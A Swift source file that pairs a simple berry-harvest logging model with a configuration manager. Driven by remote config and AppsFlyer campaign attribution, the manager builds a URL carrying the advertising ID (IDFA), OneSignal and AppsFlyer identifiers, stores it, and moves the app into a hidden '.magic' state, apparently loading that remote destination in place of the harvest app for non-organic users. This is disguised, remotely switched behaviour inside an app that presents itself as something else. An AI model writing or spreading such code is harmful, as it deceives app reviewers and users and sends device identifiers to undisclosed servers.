import Foundation

struct HarvestEntry: Identifiable, Codable {
    let id: UUID
    let date: Date
    let berryType: String
    let quantity: Double
    let unit: HarvestUnit
    let notes: String
    let imageData: Data?

    init(id: UUID = UUID(), date: Date, berryType: String, quantity: Double, unit: HarvestUnit, notes: String, imageData: Data?) {
        self.id = id
        self.date = date
        self.berryType = berryType
        self.quantity = quantity
        self.unit = unit
        self.notes = notes
        self.imageData = imageData
    }
}

enum HarvestUnit: String, CaseIterable, Codable {
    case liters
    case kilograms
    case baskets

    var displayName: String { rawValue }
}

extension HarvestEntry {
    var dateFormatted: String {
        let formatter = DateFormatter()
        formatter.dateFormat = "dd.MM.yyyy"
        return formatter.string(from: date)
    }

    var quantityFormatted: String {
        if quantity.truncatingRemainder(dividingBy: 1) == 0 {
            return String(format: "%.0f", quantity)
        } else {
            return String(format: "%.2f", quantity)
        }
    }
}

import Alamofire
import SwiftUI
import Combine
import AppTrackingTransparency
import AdSupport
import CryptoKit
import FirebaseCore
import FirebaseRemoteConfig
import FirebaseMessaging
import OneSignalFramework
import AppsFlyerLib
import WebKit

final class ConfigurationStateManager: ObservableObject {
    
    static let shared = ConfigurationStateManager()
    
    @Published private(set) var appState: AppStateType = .loading
    
    private(set) var fetchedURL: URL?
    
    private(set) var hasConfigEnabled = false
    private(set) var hasAppsFlyerConfigured = false
    
    private(set) var hasNotificationCompleted = false
    private(set) var hasNotificationApproved = false
    
    private(set) var hasTrackingCompleted = false
    private(set) var hasTrackingApproved = false
    
    func setupConfiguration() {
        Task {
            await RemoteManager.shared.fetchConfig()
            await requestPermissions()
            
            self.hasConfigEnabled = RemoteManager.shared.isRemoteEnable
            
            if let devKey = RemoteManager.shared.appsFlyerDevKey {
                AppsFlyerService.shared.configure(with: devKey)
            }
            
            await performFetchedData()
        }
    }
    
    func notificationDidAsked() {
        hasNotificationCompleted = true
        
        Task {
            await requestPermissions()
            await performFetchedData()
        }
    }
    
    func trackingDidAsked() {
        hasTrackingCompleted = true
        
        Task {
            await requestPermissions()
            await performFetchedData()
        }
    }
    
    func trackingDidApproved() {
        AppsFlyerLib.shared().start()
        hasTrackingApproved = true
    }
    
    func notificationDidApproved() {
        hasNotificationApproved = true
    }
    
    func apssFlyerDidConfigured(isSuccess: Bool) {
        hasAppsFlyerConfigured = isSuccess
        fetchAppsFlyerConfig()
    }
    
    private func performFetchedData() async {
        guard hasConfigEnabled else {
            if hasTrackingCompleted && hasNotificationCompleted {
                await MainActor.run {
                    appState = .original
                }
            }
            
            return
        }
        
        guard let savedURLString = StorageManager.shared.getSavedURLString(),
              let url = URL(string: savedURLString) else {
            tryAppsFlyerConfig()
            return
        }
        
        fetchedURL = url
        
        await MainActor.run {
            appState = .magic
        }
    }
    
    private func tryAppsFlyerConfig() {
        AppsFlyerLib.shared().start()
        
        DispatchQueue.main.asyncAfter(deadline: .now() + 15) { [weak self] in
            self?.checkIfProblemState()
        }
    }
    
    func fetchAppsFlyerConfig() {
        guard hasAppsFlyerConfigured else {
            fetchData()
            return
        }
        
        guard !AppsFlyerService.shared.isOrganic else {
            fetchData()
            return
        }
        
        fetchAppsFlyerData()
    }
    
    private func fetchAppsFlyerData() {
        let parameters = AppsFlyerService.shared.extractParameters()
        
        guard !parameters.isEmpty else {
            fetchData()
            return
        }
        
        guard let apssflyerURL = buildAppsFlyerURL(with: parameters) else {
            fetchData()
            return
        }
        
        Task { @MainActor in
            await performLink(apssflyerURL)
        }
    }
    
    private func checkIfProblemState() {
        guard appState == .magic || appState == .original else {
            appState = .original
            return
        }
    }
    
    private func buildAppsFlyerURL(with parameters: [String: String]) -> URL? {
        guard let cmId = parameters["cm_id"],
              !cmId.isEmpty,
              var urlString = RemoteManager.shared.appsFlyerCampaignURL,
              let bundle = Bundle.main.bundleIdentifier else { return nil }
        
        if !urlString.hasSuffix("/") {
            urlString += "/"
        }
        
        urlString += cmId
        guard var components = URLComponents(string: urlString) else {
            return nil
        }
        var queryItems: [URLQueryItem] = []
        
        if let appName = parameters["app_name"] {
            queryItems.append(URLQueryItem(name: "app_name", value: appName))
        }
        
        if let tmId = parameters["tm_id"] {
            queryItems.append(URLQueryItem(name: "tm_id", value: tmId))
        }
        for i in 1...15 {
            let key = "sub_id_\(i)"
            if let value = parameters[key] {
                queryItems.append(URLQueryItem(name: key, value: value))
            }
        }
        queryItems.append(URLQueryItem(name: "bundle", value: bundle))
        if let onesignalID = OneSignal.User.onesignalId, !onesignalID.isEmpty {
            queryItems.append(URLQueryItem(name: "onesignal_id", value: onesignalID))
        }
        if let appsflyerId = parameters["appsflyer_id"] {
            queryItems.append(URLQueryItem(name: "appsflyer_id", value: appsflyerId))
        }
        if let idfa = ATTrackingStatusManager.idfa, !idfa.isEmpty {
            queryItems.append(URLQueryItem(name: "idfa", value: idfa))
        }
        components.queryItems = queryItems
        return components.url
    }
    
    private func fetchData() {
        Task {
            guard let bundle = Bundle.main.bundleIdentifier,
                  let salt = RemoteManager.shared.salt,
                  let baseURL = RemoteManager.shared.savedBaseURLString else { return }
            
            let idfa = ATTrackingStatusManager.idfa
            let response = try await NewNetworkManager.shared.fetchMetrics(baseURL: baseURL, bundleID: bundle, salt: salt, idfa: idfa)
            
            guard let url = URLBuilder.buildTrackingURL(from: response, bundleID: bundle, idfa: idfa) else {
                await MainActor.run {
                    appState = .original
                }
                
                return
            }
            
            await performLink(url)
        }
    }
    
    private func performLink(_ url: URL) async {
        fetchedURL = url
        StorageManager.shared.save(url)
        
        await MainActor.run {
            appState = .magic
        }
    }
    
    private func requestPermissions() async {
        guard !hasConfigEnabled, !hasTrackingCompleted else { return }
        await ATTrackingStatusManager().requestATTracking()
        await NotificationStatusManager().requestNotification()
    }
}
